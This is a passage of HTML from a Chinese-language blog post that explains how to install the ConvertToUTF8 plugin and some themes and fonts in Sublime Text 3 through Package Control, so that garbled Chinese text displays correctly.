-<h3 id="2-安装ConvertToUTF8。"><a href="#2-安装ConvertToUTF8。" class="headerlink" title="2.安装ConvertToUTF8。"></a>2.安装ConvertToUTF8。</h3><ul>
-<li><p>通过快捷键 Ctrl + shift + P，然后在弹出的输入框输入 install，选择Package Control：install Package回车</p>
-</li>
-<li><p>在出现的插件命令行搜索ConvertToUTF8，选中回车进行插件安装</p>
-</li>
-<li><p>重启Sublime Text 3后再次打开之前中文乱码的文件发现，中文能够正常显示</p>
-</li>
-</ul>
-<h2 id="sublime-主题和字体"><a href="#sublime-主题和字体" class="headerlink" title="sublime 主题和字体"></a>sublime 主题和字体</h2><ul>
-<li><p>通过快捷键 Ctrl + shift + P ，然后在弹出的输入框输入 install，选择Package Control：install Package回车</p>
-</li>
-<li><p>在出现的插件命令行搜索Themes：ayu/edge  Font：Consoles</p>
-</li>
-</ul>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sublime/" rel="tag">Sublime</a></li></ul>
 
     </footer>
   </div>
